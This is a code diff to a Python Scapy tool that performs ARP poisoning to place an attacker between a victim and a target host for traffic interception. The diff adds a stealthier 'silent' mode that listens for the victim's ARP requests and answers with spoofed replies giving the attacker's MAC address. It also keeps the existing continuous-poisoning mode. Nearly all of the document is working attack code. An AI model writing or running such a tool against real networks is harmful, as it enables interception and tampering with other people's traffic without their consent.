@@ -9,7 +9,7 @@ victim and gateway, enabling traffic interception.
 import threading
 import time
 
-from scapy.all import (ARP, Ether, sendp, srp, sniff,)  # pylint: disable=no-name-in-module,import-error
+from scapy.all import (ARP, Ether, sendp, srp, sniff, get_if_hwaddr)  # pylint: disable=no-name-in-module,import-error
 
 
 def resolve_mac(ip: str, iface: str) -> str:
@@ -31,18 +31,24 @@ def resolve_mac(ip: str, iface: str) -> str:
 class ARPPoisoner:
     """
     Minimal ARP poisoner for victim <-> target MITM.
+    
+    Supports two modes:
+    - all-out: Continuously sends ARP poison packets at specified interval
+    - silent: Listens for victim's ARP requests and responds with spoofed replies
     """
 
     def __init__(
-        self, iface: str, victim_ip: str, target_ip: str, interval: float = 2.0
+        self, iface: str, victim_ip: str, target_ip: str, interval: float = 2.0, silent: bool = False
     ):
         self.iface = iface
         self.victim_ip = victim_ip
         self.target_ip = target_ip
         self.interval = interval
+        self.silent = silent
 
         self.victim_mac = resolve_mac(victim_ip, iface)
         self.target_mac = resolve_mac(target_ip, iface)
+        self.attacker_mac = get_if_hwaddr(iface)
 
         self._running = False
         self._thread: threading.Thread | None = None
@@ -92,8 +98,15 @@ class ARPPoisoner:
 
     def _loop(self) -> None:
         """Background poisoning loop. Runs in its own thread."""
+        if self.silent:
+            self._loop_silent()
+        else:
+            self._loop_allout()
+
+    def _loop_allout(self) -> None:
+        """All-out mode: continuously sends poison packets."""
         print(
-            f"[+] ARP poisoning thread started between {self.victim_ip} "
+            f"[+] ARP poisoning thread started (all-out mode) between {self.victim_ip} "
             f"<-> {self.target_ip} on {self.iface}"
         )
         print(f"[+] Interval: {self.interval} seconds")
@@ -102,7 +115,52 @@ class ARPPoisoner:
                 self._poison_once()
                 time.sleep(self.interval)
         finally:
-            # Always try to repair ARP on exit
+            self._restore()
+            print("[*] ARP poisoning thread exiting.")
+
+    def _loop_silent(self) -> None:
+        """Silent mode: listens for victim's ARP requests and responds with spoofed replies."""
+        print(
+            f"[+] ARP poisoning thread started (silent mode) between {self.victim_ip} "
+            f"<-> {self.target_ip} on {self.iface}"
+        )
+        print(f"[+] Listening for ARP requests from {self.victim_ip}...")
+        
+        try:
+            while self._running:
+                try:
+                    # Listen for ARP packets from victim
+                    pkts = sniff(
+                        iface=self.iface,
+                        filter=f"arp and src {self.victim_ip}",
+                        timeout=self.interval,
+                    )
+                    
+                    # Process captured packets
+                    for pkt in pkts:
+                        if not self._running:
+                            break
+                            
+                        if pkt.haslayer(ARP):
+                            arp_layer = pkt[ARP]
+                            
+                            # Only respond to ARP requests (op=1), not replies (op=2)
+                            if arp_layer.op == 1:  # ARP request
+                                # Send spoofed reply
+                                reply = Ether(dst=pkt[Ether].src) / ARP(
+                                    op=2,  # ARP reply
+                                    pdst=arp_layer.psrc,
+                                    hwdst=arp_layer.hwsrc,
+                                    psrc=arp_layer.pdst,
+                                    hwsrc=self.attacker_mac,
+                                )
+                                sendp(reply, iface=self.iface, verbose=False)
+                                print(f"[+] Spoofed ARP reply: {arp_layer.pdst} -> attacker MAC")
+                
+                except OSError:
+                    # Timeout on sniff, continue listening
+                    pass
+        finally:
             self._restore()
             print("[*] ARP poisoning thread exiting.")
 
